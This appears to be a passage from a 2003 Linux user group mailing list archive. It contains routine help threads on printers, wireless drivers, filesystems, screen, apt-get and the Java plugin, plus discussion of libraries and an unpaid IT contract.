services, since you can get a newer version of the same software in
the lobby and not have to bring it back...and if there's anybody
working for the City of Beaverton reading, yes, this *is* meant to

As far as I know, Earthlink does not yet block attachments. Many ISPs 
do, without telling which ones they block. Do your clients run any kind 
of AV/anti-spyware/net nanny kind of programs? Parental control stuff?

I imagine that if you asked them why they keep old AOL cds in 
circulation, you might glean an actual fact or two. Like they either 
have a good reason, or no one knowledgeable ever bothered to take time 
out from bitching to lend a hand.

I hate to say it, but it could be hardware. Are your printer plugins on 
an expansion card, or on the motherboard? Are you SURE all the cables 
are good? and snug?

Some things to look at:

what does the CUPS error_log say? Probably in /var/log/cups/

does dmesg find your printer?

do the printers have any self-tests?

If none of these bring enlightenment, I would reinstall CUPS. Bummer I 
know, but it often works.

But I would be looking real hard at hardware.

Carla,

  After I sent the message the cause occurred to me: there was a stuck lp1
process. Sure enough, 'ps ax' revealed the problem and killing that -- and
the cups process associated with it -- freed it all up again. Then I forgot
about my message. :-(

  This happens now and then. I believe it's when I cancel a job or
inadvertently shut down xpdf before the entire document has been fed to the
printer.

  Both printers are screwed solidly into the back of the box, but while this
happens now and then it's not sufficiently often that I instanly know the
source of the problem. It's usually after a half-hour of cursing, testing
and pulling out what little hair remains on top of my head when I think of
looking at the process list.

Thanks,

Rich

This is an interesting idea.
I don't read slashdot regularly, but I read the complete discussion
and found several interesting responses in the discussion.

I can also see why libraries might not be interested in dealing
such a thing.  They might worry about license issues as they
don't have time to research the issues.  They worry about being
roped into giving more support than they want to.  I mean
they would certainly hear about problems reading scratched CDs
and what not.  They might also worry about the stuff getting
dated too fast.

On the other hand, some smaller libraries depend on large numbers
of volunteers and might well be more interested than large better
funded libraries.

One of the people responding on slashdot simply recommended using
the libraries as a place to give away CDs.  This is an interesting
idea.  The Corvallis library has a spot for organization phamlets.
I wonder what would happen if one put 50 Knoppix CDs there which
would be labeled with the local LUGs URL and possibly a LUG flyer.

Is that one screen session with four windows? You detached once

If so, you  reattach using 
screen -D -R
This method reattaches even if you have not detached.

I hear people talk about Knoppix CDs and how they can be used to
rescue hosed machines, even Windows boxes, since they run directly off
the CD.

Can someone lend me a Knoppix CD at the AT meeting until the next PLUG
meeting in January?  I've been asked to check out my niece's broken
Windows box (yes, I know, but it's FAMILY).  Anyway, her son is
apparantly a young geek with a lot of potential, so this may be a
chance to turn him onto Linux.

I already did when I noticed it.  They hadn't a clue why they kept it.
When I offered to dispose of it, they gave me a shocked look and
threatened to have me charged with destruction of city property.

I've given up on WILI libraries (though miss their tendancy towards
MASSIVE video selections kept relatively current).  Even broke my card
peeling an adhesive hook off a bathroom tile while helping a friend
move out of an partment.  I've since lost a Vancouver, BC library card
(actually used!) since then.

Subject: [PLUG] Relative newbie needs help bringing wireless MN-520 on-line
Message-ID: <3FE01072.5050609@pobox.com>

Fairly new to Linux, but most things seem to be going well. That is, 
except when I try to activate my wireless connection. I get:

cannot activate network device wlan0!
prism2_cs device wlan0 does not seem to be present, delaying initialization.

In spite of the fact that cardcfg yields:

Socket 0:
  product info: "NETGEAR", "FA411", "Fast Ethernet"
  manfid: 0x0149, 0x0411
  function: 6 (network)
Socket 1:
  product info: "Microsoft", "Wireless Notebook Adapter MN-520", "", "1.0.3"
  manfid: 0x02d2, 0x0001\
  function: 6 (network)

The same results happen when the FA411 card is not present.

I dug into linux-wlan-org before making my purchase and read a lot about 
how to install this.

I'm fairly sure I have /etc/wlan/wlan.config and 
/etc/wlan/wlanconfig-SSID correctly written and I've installed all three 
packages for linux-wlan-ng v0.2.1.pre-14 and am running Fedora Core 1 
(updated via yum to be pretty much current.)

Any pointers? advice? comments?

Thanks in advance.

Subject: [PLUG] deadbeats on contracts. . .
Message-ID: <E1AWXSx-0004iA-00@drizzle.pdxlinux.org>

Perhaps asking this here is like asking /. for legal advice, but I'd
like to give it a shot anyways. Most of you seem to have jobs that
actually last more than 3 weeks, but hopefully someone has had an
experience like mine, although I think this must of have set some
records for the "most messed up contract".

I worked on a contract up in Washington with a couple other folks, a
project that I have coined "the contract from hell", and basically it
consisted of user malfeasance and gross incompetence at every turn.

Now there is a small matter of $6000 of labor / equipment that they
haven't paid for. Naturally, I'd like to see that we get our money. It
has been well over 30 days since we sent them a bill and still have
not received anything except for some poorly worded and misspelled
letters that contradict each other.

Everything went to hell when they told us to install software that
they didn't have licenses for and we refused (well, it was bad before
then, with problems ranging from their IT guy installing Windows NT
3.1 on one of the (running) servers (no, not 3.5.1, 3.1!!!!!),
destroying a running server knocking it off a table and then claiming
we gave him defective equipment (wonder of wonders, one of the hard
drives didn't survive the 5' fall.) and the final straw was when their
"IT guy" wanted us to convert his "linoox" boxes running samba into
windows boxes, even though he didn't have licenses for it).

We've tried to get paid, but this company has basically been jerks
during the whole process, doing everything from telling us that if we
showed up, the police would be called, not responding to any
communications - email, phone and somehow having certified mail held
at the post office, so we are kind of at a loss for what to do.

We have documentation to the effect that they clearly do not have
enough licenses for their current setup - not only for one or two
products, but virtually the entire set of applications that they use -
ranging from windows to office to autocad to some 3rd party accounting
software, but we are hesitant to call the BSA because they would
basically bankrupt the company and I don't think we want to be
responsible for something like that. I'm not suggesting that we would
blackmail them with this either, that isn't "nice". . .

It looks like the best thing right now is to file in small claims
court, but we are looking for some other options, such as repossession
/ putting a mark on the company's credit record. It would be nice to
have a lawyer actually work for us, but the limited amount that they
owe us doesn't exactly seem to attract lawyers who don't want money up
front.

Any advice would be appreciated, thanks
Karol

Keith Laufstrom usually brings a stack.  There should be a few on hand
that you can have.  (I will try and remember to bring one in case Keith
forgets.)

Try this:

Some of the people there have gotten it to work.  It is a prism2 card,
so it should be usable.  (Unless the "Microsoft" portion is
conflicting.)

No, I detached all four separately.  Maybe that was a silly thing to
do.  I was hoping to launch them with separate "screen -d -m
run_foo.sh" instances.  Is there some other way to automate launching
one screen session with four windows, each running its own local script?

If you start screen, then use c-a c to create as many windows as you want. 
Then switch to the window you want using c-a 1 or c-a 0 etc.
In each window you can run whatever you want, then when you detach
c-a d and reattach using screen -D -R each window will be running
what it was running when you detached.
Is this what you want?

  A couple of years ago I had a sub-contract to a couple of geologists. When
the client refused to pay my bill for new work done more than a year after
the original work, the geologists sided with the client!

  I contacted my lawyer and let him handle it. My standard contract includes
language that the party at fault pays attorneys' fees and that invoices not
paid after 15 days _may_ accrue interest from the date of issuance.

  To make a long story short, what would have been an $8,000 bill cost the
client more than %11,000 because of interest and legal fees. I paid about
$1,200 up front, but got about a third back later. Was it worth it? You bet
it was!

  He's good and he's fun to have working on your side. A simple letter from
him may solve your problem. In my case, we told them we were filing suit the
next day and the geologists showed up with a check for the full amount -- a
certified check, btw -- at 4:00 pm.

Message-ID: <20031217141244.GA20396@themontagnes.com>

I seem to have a problem with reiserfs.  When using cp -al on a large
group of files I get lots of errors that look like this:
Dec 17 06:08:11 zipper kernel:
vs-3050: wait_buffer_until_released: nobody releases buffer (dev

JDIRTY !JWAIT
The partition becomes inaccesible.
This seems to be a reiserfs problem and I can solve it by changing
filesystems.  I have several partitions on this drive (all reiserfs).  

How do I reformat just that single partition to ext3 or ext2?  I
realize that the data will be lost on that partition but are the
others safe?  I'll back up real important data, but how worried should
I be?

Can you say S C R E W E D?

I know you know that you know jerks are jerks. 

When any job knowingly asks me to install unlicensed software, I tell
them it could cost me my livelyhood, mark it on the calendar and plan my
exit, sometimes in less than a day. These are the most unlikely to pay
on time if at all. Your "IT guy" and I use the term loosely, is a big
clue, too.

Unscrupulous is as unscrupulous does in my book.

Sorry to hear about your experience.

Are you sure that pcmcia services are up by then? My fedora install says
that on boot, too, but it turns the card on later after it initializes
the pcmcia services. It works fine for me, different NIC.

I'd look for a different indicator of your true problem.

Look into mke2fs.

iirc,

mke2fs -j /dev/<partition>

will make it an ext3 partition. Your other partitions should be safe.

1. What do you get when you run /sbin/iwconfig, with the card both in
   and out of the slot?

2. If you run "dmesg | less" can you find any indication that the
   wireless card has been detected by the kernel?

You'll need to umount the partition first, run mke2fs, then mount it
again as an ext2 partition.

Also, be sure to edit your /etc/fstab and change the partition type to
ext2 so it will be mounted correctly at next boot.

What's wrong with any of the things you mentioned in this post?

OK, I can definitely see that having AOL CDs available in the lobby is
kind of fucked-up because of the conflation of commercial and public
interests (the advertising of AOL through the stand-up full of discs and
the public nature of the library), but I can't see how that actually costs
the taxpayers MONEY (though it costs other things, surely).

Cataloguing the CDs they get in the mail and making them available for
checkout is FANTASTIC (and probably very inexpensive).  A public library
is a public repository of information, past and present.  Do you think AOL
would give you a copy of AOL 3.0 if you asked for it?  I don't.  What if
you wanted to do a binary analysis of the information or compare what kind
of features and bundled promotions were available in various versions?
The model of proprietary information makes this kind of historical work
impossible.  The entire purpose of a public library is to counteract those
effects.

The -j switch tells it to make an ext3 partition.

Or just use mkfs.ext3 /dev/<partition>

You could sell the bill to a collections agency for probably about $600,
I think.

AFAIK (I'm no lawyer) small claims court maxes out at $5K.  Since we're
crossing state lines, things may be even more complex than that.  If you
are unable to file in Washington state as your company is (I assume)
based in Oregon, that leaves Federal court... and I don't know about how
things go there, but I think they're a bit busy for claims as small as
$6000.

I'd suggest following Rich's advice of contacting an attorney and
allowing them to write a letter on your behalf... they'd also know for
sure what your options really are.

So mke2fs will delete all the data during this process.  Those 3
stepsare all that's necessary? 
1. umount
2. mke2fs...
3. change fstab

That sounds too simple.

Well, their IT guy is pretty unique, but don't get me
started. I suppose it would be obvious that if they are too
cheap to pay for licenses, they are too cheap to pay for
work, and once they asked us to start doing that, it began
to look bad at that point. . .

Let's just say I want to do it that way. That is,
after copying the Linux .iso's to a Windows partition
of vast dimensions. 

Apparently, you need a Windows utility for
manipulating .iso's. The choices given are ultraiso,
winiso, isobuster, and winrar. What they all have in
common is that they cost about $30. Being able to work
with iso's is valuable, so I am willing to pay it, if
necessary. But does anyone know of a free, or
lower-cost, WINDOWS utility for this purpose?

I added Debian's 'testing' distribution to the sources.list file,

play with!  ...and one less working NIC: eth0 is gone.

Points of fact:

1. netstat -a shows only the loopback.

2. kudzu saw and configured the NIC (it's an Intel 8259a IIRC) but
   after a reboot, there's still no eth0.

The million dollar question is: how do I inform the system of this NIC?

Thanks a bunch,
Joshua

PS Pointers to FAQ's, HOWTOs, docs, would be great. I can read, I'm
   just not sure where to start.

I would start with the basics.

cat /proc/pci

See if that tells you exactly what kind of card you've got.

modconf

Use modconf to add the appropriate driver under drivers/net.

That should do it.

All you probably need to do is load the appropriate module. Try, e.g.,

  modprobe e100

and then "dmesg | tail" to see if that worked. If not, try Donald
Becker's older driver:

  modprobe eepro100

If all that fails, post the output of /bin/lspci to the list.

You might want to try fsck.rieserfs --rebuild-tree /dev/bad_part. This
takes a while but will rebuild the file system for you.

Yes, except that I (ideally) want each of those windows to run
something I tell screen from the command line.  That is, I don't want
to manually go to each window and launch a script, I want to say:

 $ screen <unknown options> run_stuff_in_four_windows.sh
 $ screen -D -R

and find four windows running the four different things that I asked.
Maybe I am asking too much.

One a more simple note, did you install a new kernel?

If not try

/etc/init.d/network restart

also check to see what /etc/network/interfaces tells you.

there should be something like

auto eth0
iface eth0 inet dhcp

I was at the OS conference and I listened to a couple of lawyers discuss
the SCO debacle.  One of the lawyers said something that stuck with me.

For 37 cents (mailing fees) a lawyer can send a letter.  That is usually
enough to resolve the issue.  Just the letter.

Now the letter might cost you anywhere from $200-$400, but your chances
of getting paid probably go up dramatically.

I did something like this, but I had to drive it from "expect".  Hopefully
someone who knows TCL better can fill in some of the warts (like the
exactly 4-commands restriction):

I never did find some way to specify multiple commands directly to screen.

The usage is like:

The first argument is what the screen session gets called.

Karol,

Sorry to hear about your experience.  I strongly recommend you find a
lawyer, as I'll explain below.

I'm not a lawyer, but I've some experience with small claims in Oregon.
According to a quick Google, the Washington Small Claims court limit is
$4000.00.  I THINK that Washington courts would have jurisdiction
because you performed the work in Washington, and because that is where
the customer's business is located.  You might be able to file in Oregon
anyhow, but I think it would be a long shot.  If you were able to
successfully file the claim in Oregon, the limit is $5000.00

REASONS to hire an attorney:
1.	The damages are above the small claims court limit in EITHER
potential jurisdiction.
2.	There are other potential "causes of action" and "damages" to
consider (namely the licensing issues, also the legal costs.)
3.	The attorney can advise you on your chances of finding your
money (particularly if the company is in poor financial health.)
4.	The attorney can help you "pierce the corporate veil" and go
after the owners personally IF the company is incorporated and IF the
company has not observed proper corporate practices (it sounds like they
might not observe proper practices, doesn't it?)

If you decide to use the small claims process anyhow, I believe you will
find that a judge only wants to see that you ATTEMPTED to contact the
company via certified mail.  It is not your problem if you attempt to
contact them and they do not respond.  Use a sheriff to serve them.
($20-$50 usually).  

Plan on spending a lot of time researching the legal issues.  While
Small claims courts don't require the legal formalities that a Circuit
or Superior courts do, Small Claims Judges still base their opinions on
legal facts.

Specifically, you'll want to research contracts & breech of contract,
liabilities on the licensing issue (are YOU liable?), and what it will
take to LEGALLY prove that the company owes you money.

If the judge finds in your favor, you will then have to collect the
money judgement, which is a whole separate battle.

Hope that helps.  Sorry for your trouble.

Erik.

One thing to add to the other good replies-

The one downside to filing in small claims court in Oregon, if that is 
one of your options, is they can escalate the suit to a higher court. I 
forget the exact details now, but Oregon law is screwy in this regard. 
Most states keep small claims cases in small claims court. Once it's in 
a higher court there is no way you can represent yourself successfully- 
the paperwork alone requires a trained person to handle it.

You might try using .srceenrc to include the commands or specify another
file using screen -c file.

In my test case I created a file monkey with the following in it

screen -t local 0 ping localhost
screen -t www.yahoo.com 1 ping www.yahoo.com 
screen -t  local_ssh 2 ssh localhost 

then ran `screen -c monkey` in a xterm. This seems to work for me.

Thank you
Russell

I once paid a lawyer $100 to send a 32 cent letter. He went to the law 
library and copied a standard wording out of a book, signed it and mailed it.

Most law libraries have books of boiler plate letters and forms. I would be 
surprised if you couldn't find it all on-line. I cannot remember the name 
of this book.

  What we pay big bucks for is the letterhead that reads, "From the Law

  I know that I can have multiple versions of a library installed, and
software that was built with a particular flavor will use that one when
fired up. What about compilers?

  On my notebook gcc-3.2.3 is installed, but to compile the winmodem driver
I need gcc-2.96 from Red Hat. Are there a couple of files I can copy from
the RH 7.3 box to /lib on the Slackware box? If a build looks at
/proc/version and sees that the kernel and modules were built against
gcc-2.96, and finds such a version installed, will it use it and ignore the
gcc-3.2.3 that is there?

  New territory for me.

Thanks,

Totally. You essentially only need the /usr/lib/gcc-lib. /usr/bin/gcc
itself is pretty much a "wrapper", but copying it along and renaming
it can be helpful to avoid the somewhat cumbersome command line
options to switch backends. Also note that a matching binutils set
would be helpful.

The build is looking for specific versions? Why not just go into the
build scripts and have it skip that bit?

Chris,

  Perhaps at Saturday's clinic. I traced through the scripts to one that
calls /proc/version and reads that. That's when I ran out of time and
knowledge.

  While Slackware-9.1 installed the 2.4.22 kernel with gcc-3.2.3, Emperor
Linux apparently built the kernel and modules on a Red Hat 7.3 system. I
don't know if I can build this one module with gcc-3.2.3 and have it load
and work properly. If I can work with One Who Knows What He's Doing I'd be
happy to explore options.

Thanks,

Rich

West Law Library is one.  It is on a CD that the lawyers buy, and they
cut-and-paste into Word.  The really funny thing is that they often
cut-and-paste generic stuff that does not match Oregon Statutes - I
once checked some incorporation papers (that I paid $1000 for) against
the applicable ORS statutes and found a number of things that were
flat-out wrong.  When dealing with lawyers, it is best to write the
document yourself and pay the lawyer for debugging and their chop.

  Thanks, Don. I suspected that it was a full-blown paranoia attack, but I

Chris,

  Apparently Lincoln and his crew customize the kernels and modules for each
distribution and laptop model they resell. They do this to ensure that all
the hardware and capabilities work. It must be a major effort -- and PITA --
but that's how he's chosen to do business. It works fine until folks like me
get distracted, don't pay attention, and hose the system. :-)

 Is this a joke?? It blocks the recipient from seeing the attachment, 
but it's still attached to the message. How lovely for taking advantage 
of all those nice auto-execute features! So it can still do its dirty 
work, but the recipient will be bathed in a nice, warm bath of 
ignorance.

 "Outlook 2002 includes a new security feature that blocks attachments 
that are considered unsafe. If you receive an e-mail message that 
contains one of the blocked file types, you may receive the following 
warning message:

Outlook blocked access to the following potentially unsafe attachments: 
[...]
Although Outlook has blocked access to the attachment, the attachment 
still exists in the message."

And if the user is determined enough, and can follow simple 
instructions, they can go ahead and open it.

ow ow ow wake me up when sanity returns, please.

If you're using a RedHat Enterprise 3.0 variant, load the 
"compat-gcc-...." rpms.
They contain gcc 2.96.

I ended up getting the Airnet+ WLC010 from Fry's.  $30, the cheapest
they had.  I saw it yesterday, tried to decipher the chipset... ended up
downloading the Windoze drivers and ripping them apart to locate the
chipset ID.

It's an Intersil Prism II based card... essentially the Intersil
reference card with different stickers as far as I've been able to
decipher.

Using the Hermes kernel drivers (orinoco_cs module) the card was
recognized and my AP saw it as being associated.  The card, however,
didn't realize it was associated.  I was unable to change the SSID nor
was I able to enable WEP.  I booted into Windows to test the thing,
which caused my clock to FUBAR up, which caused many log entries to go
unlogged or be destroyed, so I can't get the exact errors I was
getting...

I ended up using the wlan-ng drivers.  2.0.1-pre16 worked.  pre11 didn't
compile against 2.6.0-test11 properly.

These drivers pretty much suck, but they at least work.  I *really* like
iwconfig compatability, and that's just not here.  I can't get WEP
working, I'm not sure if it's my configuration problem or a driver
problem... it seems card services is just able to do enough to set the
card to SSID ANY and anything beyond that must be done manually.  I'll
live without WEP, though.. there's nobody around here to steal my
connection.

Just wanted to share my experiences with this card, maybe for future
googlers if for nobody else.  It seems like a decent deal on a WiFi
card, I suppose.

Potentially clueless spamtrapping.  Have you explored Earthlink's

I'm not quite sure Earthlink's (or most ISPs) put quite as much

Don,

  I'm not running RH, but Slackware-9.1. I don't know if Patrick has a
compat-gcc package. But, I'll look.

Message-ID: <86wu8uz8uw.fsf@coulee.tdb.com>

Okay, I am baffled.  I am ssh'ing into a remote machine (it happens to
be a Debian UML virtual machine) and for some reason I am getting
a null $DISPLAY when I get there.  This is despite /etc/ssh/ssh_config
setting "ForwardX11 yes" on the local side and /etc/ssh/sshd_config
setting "X11Forwarding yes" on the remote side.  My local $DISPLAY is 

  $ echo $DISPLAY           
  :0.0

but after ssh'ing in, at the remote end:

  $ echo $DISPLAY
  

On a working remote host, I see e.g.:

  $ echo $DISPLAY
  localhost:12.0

I've diff'd the sshd_config on a working versus not-working remote
hosts and they are identical.  Both sides are running OpenSSH
3.6.1p2-10.  

I just noticed that .Xauthority is empty on the non-working remote
host, whereas the working remote host's .Xauthority is non-empty.
Name resolution works in both directions.

WTF is the matter?

Let's just say I want to do it that way. That is,
after copying the Linux .iso's to a Windows partition
of vast dimensions. 

Apparently, you need a Windows utility for
manipulating .iso's. The choices given are ultraiso,
winiso, isobuster, and winrar. What they all have in
common is that they cost about $30. Being able to work
with iso's is valuable, so I am willing to pay it, if
necessary. But does anyone know of a free, or
lower-cost, WINDOWS utility for this purpose?

I'm not sure what you mean by manipulate, exactly.

I use daemon-tools to mount iso's in windows- it saves
wear and tear on my game cd's, and speeds up level loading
because it eliminates cd spin-up lag. Free for personal
use, business = $16.
http://www.daemon-tools.cc/portal/index.php


You can certainly mount the cd's in linux with something
like:
mount -o loop -t iso9660 filename.iso /mnt/iso 
(courtesy of http://www.linuxhelp.net/isos/ )

Does that help?

1. What do you get when you run /sbin/iwconfig, with the card both in
   and out of the slot?

"no wireless extensions"


2. If you run "dmesg | less" can you find any indication that the
   wireless card has been detected by the kernel?

no. I cannot see any indication at all. Looking at examples from
linuxquestions.org I think I need to edit /etc/pcmcia/config so it has an
entry reflecting the card and binding it to the linux-wlan-ng driver. Does
that seem likely?

Message-ID: <1935.216.99.218.67.1071752746.squirrel@sautez.com>

I had a HD go from ok to feeling sick.

Now I can't get it to mount.  I'm giving the familiar superblock error:

 e2fsck -b 294912 /dev/hdc1
e2fsck 1.27 (8-Mar-2002)
e2fsck: Bad magic number in super-block while trying to open /dev/hdc1

The superblock could not be read or does not describe a correct ext2
filesystem.  If the device is valid and it really contains an ext2
filesystem (and not swap or ufs or something else), then the superblock
is corrupt, and you might try running e2fsck with an alternate
superblock:
    e2fsck -b 8193 <device>

I tryied to run e2fsck on the ext3 partition and tried all the super
blocks that mke2fs -n /dev/hdc1 tells would have been created.

Since I can't find a good superblock is there a way for me to create
them?  I do see that I can run mke2fs -S and that will recreate the
superblocks and group descriptors but wanted to run the problem past
you before I jump into that last ditch effort.  There is a little bit
of data left on the disk I would like to copy off.

Thanks,

Josh

You're screwed.

This is the first firewire chipset Sony made and it's highly
proprietary. They abandonded it, and the next chipsets were OHCI
compliant. I wish it worked in my Vaio, too.

Try a Google search on CXD1947 if you don't believe me. ;-)

Message-ID: <200312170834.24405.guy1656@ados.com>

Good article in Wall Street Journal yesterday on Linux on the desktop.
Section D front-page, even.

[No I don't have a link - I receive it in 'dead tree' format... ]

Three paragraphs of benefits - Linux is free, most applications for it are 
free, etc. "[Linux is growing beyond the] 'extreme experts of 8 or 9 years 
ago to include lawyers, artists, and dentists...]"

"One reason is that several makers of Linux are smoothing out the installation 
process - once a task thatinvolved whacking through a thicket of jargon and 
fiddling with configuration files."

The article then spends about a column on cobbling older used stuff together 
to make a decent machine for about $298.

"Getting Linux isn't as easy as asking the guy behind the counter of your 
local computer store if he has it in stock..."

"If you have broadband (or a surfeit of patience) you can download these 
distributions for nothing. 
     "We picked that option and settled on the noncommercial Debian 
distribution, which has a reputation for being very conservative about adding 
cutting-edge features that could make a computer choke. Unfortunately it's 
more difficult to install than some, though Debian developers are working on 
that.)"

Dear All:

I am using Mozilla 1.5 on my RH 9.0.  I visited a website
that requires Java plug-in and a window pops up asking
me to download and install Java plug-in.  I clicked yes and the process
declares that java plug-in is installed correctly.
However, when I revisit that very same site, it prompts to install
java plug-in again.  I repeated the same process twice and I still don't
have java plug-in defined to view that site.

I clicked in  a few places in Mozilla to find out how but I could not see 
anything related
to this.  Any special tricks to define java plug-in so Mozilla can recognize 
the type?

Since I first read this post, I have purchased a Prism II card that has
required the use of the non-wireless-extensions-friendly wlan-ng
driver/utility... so perhaps I can help.

Microsoft makes WiFi cards now?  All the better to spread viruses with?

With the card in the slot, please run iwconfig wlan0 and tell me what
you see.  If it says no such device, then our problem is a few steps
below having the configuration files.

If it says no wireless extensions (in response to Paul's email you said
that is what it said, but failed to mention the device names to the left
of where it said no wireless extensions - you do have one to two other
network devices in there that iwconfig would check)... something is
strange with the drivers.. it shouldn't say that if the driver is
loaded.

What's the output of "lsmod | grep prism"?

We can work from there, I think.

Rob

Thanks Jeme, Paul Heinlein, and Paul Johnson. I used modprobe -t <dir>
(try every module in dir until one works). As it turns out, the 8139too
driver works... mostly. I'm still seeing spurious IRQ7 interrupts, but
at least I'm back up.

Thanks again,

I believe you'll have to go the manual route.  Go to www.sun.com and 
follow the links to Sun's java website. You'll find the JRE available in 
rpm format, download and install.  Also pay attention to the instruction 
that tell you how to setup the java-plugin for Mozilla/Netscape.

  Hokay. Got this one solved.

  Turns out that if I go to the hsf modem directory (/usr/lib/hsf/modules)
and modify common.mak so the declaration is 'CC=gcc', then the compiler uses
what's on my system without looking at /proc/version.

  Modules are now built, and /dev/modem -> /dev/ttySHSF0. Haven't yet tried
it out, but I will.

  Now to the USB->serial cable. I'll bring that on Saturday to the clinic.

Thanks all!

I have found that Ebay is a good source of various
odds and ends. I'm sure I have seen a Cisco 678 there
at a very attractive price, though the situation
changes from day to day.

I think Cisco will stop supporting the 678 at the end
of this year (or is it next year?) It's either until,
or through, 2004. In any case, I haven't had any
trouble with mine, which I still need.

Now you can try Linux without inhaling. Mandrake now
offers a "Live" distribution with external storage:
you can save some stuff on a removable USB device,
rather than the hard drive. That's why it costs more
than you'd expect ($70 or so).

"MandrakeMove is also an ideal way to help expand
Linux adoption as it 
doesn't require installation and may be used without
advanced knowledge 
of computing."

Is that statement true? I suppose someone who tried
Linux in this way, with a relatively high cost for
their first product (though much cheaper than
Windows), and was disappointed, would not likely
return to Linux.

Details about MandrakeMove are available at:

Actually, at least for my ssh version, those sshd options are largely
wrong, but since you chose the intuitively obvious ones, they
immediately made sense and I was able to translate them to the ones my
sshd understood.

On the remote host, I used:

  # sshd -D -d -p 2222 > /tmp/debug-log 2>&1

and at the client side, I used:

  $ ssh -p 2222 -X -v <remote-hostname>

On the server side, I am seeing:

Ypu will get a file that has an jr..._..._rpm.bin.  You run that, agree
to the license and then get an rpm.

The next trick (and why isn't this automated) is to add *links* to
mozilla pluging like this (as root)

ln -s /usr/java/j2sdk1.4.2_01/jre/plugin/i386/ns610-gcc32/libjavaplugin_oji.so /usr/lib/mozilla-1.4/plugins/

Note it has to be a link, and the directories may be different.  You can
link to your own directory (.mozilla/user/....salt/plugins).  Not the
gcc line, its important.

When you are done you can test by going to help->plugin and if java
shows there try loading 

        /usr/java/j2sdk1.4.2_01/jre/ControlPanel.html


I wish this were a bit more automated.  I mean how hard is it to right a
script that does a locate on mozilla binaries, checks the lib, and then
links the plugin to all directories.

I'm using apt to upgrade a remote server that isn't running X.

Is there a way to upgrade only 1 package?  Everything in the man
page for apt-get says that upgrade doesn't take a package argument.

Am I screwed, or do I need another tool?

 You're screwed if you use apt-get upgrade for a single package, that's 
not what it's for. :)  First run apt-get update to update your 
sources.list, then run apt-get install <packagename>. If there is a 
newer version, it will install it. Do apt-get install <packagename> 
--dry-run to do a test drive.

apt-get upgrade upgrades all installed packages, but will not install or 
remove programs to satisfy dependencies, so many packages will not be 
upgraded.

apt-get dist-upgrade does a complete system upgrade, including 
installing/removing as necessary to satisfy dependencies. Add the -u 
switch for a preview: apt-get -u dist-upgrade. 

Anytime you want to do a dist-upgrade, run apt-get -u upgrade first. It 
works better.

Okay, "install" will install or upgrade as needed.  Will it also
automatically resolve dependencies and install additional packages?

Why?  Is it more efficient because upgrade doesn't try to resolve
dependencies?

Yep. That's what makes apt-get so addictive.

I don't know why, it's just my experience that it works better that way.

install will install dependencies, but there is a catch. Unless you
specify one of the quieter modes, "apt-get install <package>" will stop
and ask you for confirmation, but only if there were more packages to
install than what you asked (i.e. if there are dependencies which it must
resolve). If it only needs to install one package, it'll proceed to do it
without confirmation.

Good solution. Didn't know those existed.

FWIW-When I'm on sid, I always use dist-upgrade, because each day may
bring a whole new system. :-)

IMO "upgrade" is only useful on systems where you want absolutely no
change in behavior, whatsoever. E.g., production systems with
applications developed for a specific version of ... php ... or
something. I.e., all you want are security updates and/or fixes, not
"improvements".

Subject: [PLUG] Newbie Troubleshooting Repeated Crash / Kernel Panic in IPCop
Message-ID: <000801c3c5d0$f7703020$0a01a8c0@lemonhead>

Hello,

I've got an IPCop box running on a Pentium I @ 166Mhz.  The system boots
without generating any messages which I find suspect, yet the system is
very unstable.  Usually, it doesn't manage to stay up for more than 24
hours at a time.  I'm profoundly inept with Linux (I'm a recovering
Windows wussy), and in spite of Googling around can't seem to find
answers to the following questions:

1.  Where might I find kernel panic messages logged?  Is there something
I must do to cause kernel panic messages to be logged?

2.  Given a kernel panic message that mentions the swap partition, what
troubleshooting steps might one take to isolate and resolve the trouble?

Usually when the machine fails, the screen goes black and does not
respond to pings on the Green interface, nor keyboard activity at the
console.  No lights on Num lock or Caps Lock.  Generally the last
message in the DMESG ring buffer shows some packet stopped at the red
interface.  The system has three ethernet interfaces.  One runs the NEII
driver and is an old ISA card, the other are Linksys cards running on
the Tuplip drivers.

The reason I suspect swap file (NO swap PARTITION!) problems is because
I did see ONE kernel panic message that mentioned to word SWAP.  Alas, I
lacked the forsight to copy exactly the error message...

Any advice you can give would be helpful.  Thanks for your time, 
Erik.

Can you just boot this machine and not run anything?

Let the system cook. <No IPCop>

Could be flaky hardware. <Software could be ok>

AFAIK, there is more than on way to set up quotas with Postfix, none of
them standard.

How'd you set it up?

This probably won't be too useful, but. . .
I have a projector, but no bulb which this is why this email
is going out to the list.

If anyone has a bulb for an InFocus LitePro 580 (i.e.
someone who works/ed at InFocus and got cheap bulbs or if
someone has a spare kicking around (Bulb is LP580), I'll
bring it to the rest of meetings and the such.

I really have no use for it at home, it is sitting unused in
my room. Bulbs are quite expensive retail, but they last
1200 hours.
Some crackhead on eBay is trying to sell the same projector
for $5400, but if someone found me a bulb, it would be on a
semi-permanent loan to plug. . .

Cheers!
Karol.

I bought a two port no name pcmcia firewire card off of ebay for $4.95
plus $5 in shipping. Works in linux as well as Windows although it
won't power anything I have. All my firewire devices have an alternative
power source so it works for me, hard dirves, and external DVD . 

http://cgi.ebay.com/ws/eBayISAPI.dll?ViewItem&item=3448244430&category=39966
Deal tree, in this auction, is from who I bought. I guess the prices /
shipping are up because of Xmas and IPOD / mp3 player frenzy.  There are
quite the few ogg players on the market this year as well, so maybe its
OSS geeks causing the frenzy?

Thank you
Russell

I'm not sure what I would do if I was in you situation, but I think I
would try this first before trying to write to the disk.

I've been using dd_rescue for a while but never this script. The time
issue this script tries to work around is an issue, and is why I would
try it. All my failed disks are now fridge magnets, so I can't try it
out before posting, sorry.

They are actually rated for only 600 hours.

Yeah, since that model is out of production and only sold for $4,799
MSRP.  Bulbs are about $289. I don't know of anyone who has spares.

linux_area/IBM_linux_commercial.mpg is mode 0600 and owned by UID 104.

Most of the files appear to be owned by UID 104, GID 500. Some of them
are marked user writable, some not.

I was curious how those programs were built? I've been wondering where to
find a build of GTK for those systems, and how one goes about building

Vim isn't too bad for light edits, but emacs in psgml mode is my
preference. If you've got a decent XML catalog on your system that
maps public Doctypes to local files, it'll parse the DTD and do all
the validation you need. I can't say enough good things about it.

Any chance you have power management (APCI or whatever it's called)
turned on and it's automatically powering down the box after x amount of
time of inactivity?

While all projector bulbs are spendy, this is way out of line.  From the
picture on line ( http://www.donsbulbs.com/bulbs/g/ib/sp-lamp-lp5.jpg ),
it looks like a $50 bulb welded into a $250 cage.  I wonder if it would
be possible to do a little "real hardware" work to mount a socket into
that cage, then put a normal two-prong bulb with the right power and
optical spacing into that socket.  I wonder if this would make a nice
little side business for somebody?

Some similar work needs to be done on the spare two-prong socket in
